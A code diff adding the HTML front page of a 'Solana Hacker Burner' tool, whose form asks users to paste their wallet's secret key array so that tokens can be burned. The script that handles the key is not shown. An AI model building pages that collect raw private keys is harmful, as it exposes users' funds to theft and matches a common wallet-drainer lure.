@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Hacker Burner</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <div class="hacker-container">
+        <h1 class="glitch" data-text="SOL BURNER">SOL BURNER</h1>
+        <p class="description">Enter your secret key array to burn tokens and reclaim SOL.</p>
+        <textarea id="secretKey" placeholder="[Enter your wallet secret key array here]"></textarea>
+        <button id="connectButton">CONNECT WALLET</button>
+        <div id="tokenList" class="token-list"></div>
+        <button id="burnButton" class="burn-button" style="display: none;">BURN TOKENS</button>
+        <div id="status" class="status"></div>
+    </div>
+    <script src="app.js"></script>
+</body>
+</html>
